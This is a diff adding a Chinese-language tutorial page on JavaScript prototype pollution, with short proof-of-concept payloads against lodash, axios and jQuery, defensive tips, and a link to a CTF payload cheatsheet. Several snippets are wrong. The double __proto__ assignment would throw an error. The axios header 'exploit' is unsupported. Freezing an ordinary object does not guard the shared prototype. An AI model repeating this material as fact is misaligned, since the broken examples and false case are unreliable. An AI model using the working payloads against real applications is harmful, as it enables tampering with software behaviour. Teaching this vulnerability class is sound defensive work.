@@ -1,0 +1,76 @@
+---
+title: JavaScript 原型鏈污染
+description: JavaScript 原型鏈污染
+keywords: [JavaScript, Prototype Pollution]
+date: 2023-02-02T01:22:05
+---
+
+# 什麼是原型鏈污染
+:::caution
+先備知識：
+- [JavaScript 的繼承關係]("docs/邁向現代前端開發/JavaScript 的繼承關係.mdx")
+:::
+
+原型鏈污染是指當一個物件的原型鏈被修改，導致其他物件的原型鏈也被修改，這種修改是不可預期的，因為它可能會影響到其他物件的行為。
+
+# 原型鏈污染的危害
+原型鏈污染的危害主要有兩個：
+- 會影響到其他物件的行為
+- 會影響到 JavaScript 的內建物件
+
+## 會影響到其他物件的行為
+```js
+const obj = {}
+const obj2 = {}
+obj.__proto__.a = 1
+console.log(obj2.a) // 1
+```
+
+## 會影響到 JavaScript 的內建物件
+```js
+const obj = {}
+obj.__proto__.__proto__.a = 1
+console.log({}.a) // 1
+```
+
+# 如何防止原型鏈污染
+## 使用 Object.create() 來建立物件
+```js
+const obj = Object.create(null)
+```
+
+## 使用 Object.freeze() 來凍結物件
+```js
+const obj = {}
+Object.freeze(obj)
+```
+
+# 實際案例
+## 1. lodash
+```js
+const _ = require('lodash')
+_.set({}, '__proto__.a', 1)
+console.log({}.a) // 1
+```
+
+## 2. axios
+```js
+const axios = require('axios')
+axios.get('https://example.com', {
+  headers: {
+    'Content-Type': 'application/json',
+    '__proto__.a': 1
+  }
+})
+console.log({}.a) // 1
+```
+
+## 3. jQuery
+CVE-2019-11358
+```js
+jQuery.extend(true, {}, JSON.parse('{"__proto__": {"a": 1}}'))
+console.log({}.a) // 1
+```
+
+# 其餘參考資料
+- 這邊有更詳細更邪門的 Payload [CTF Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet#prototype-pollution)
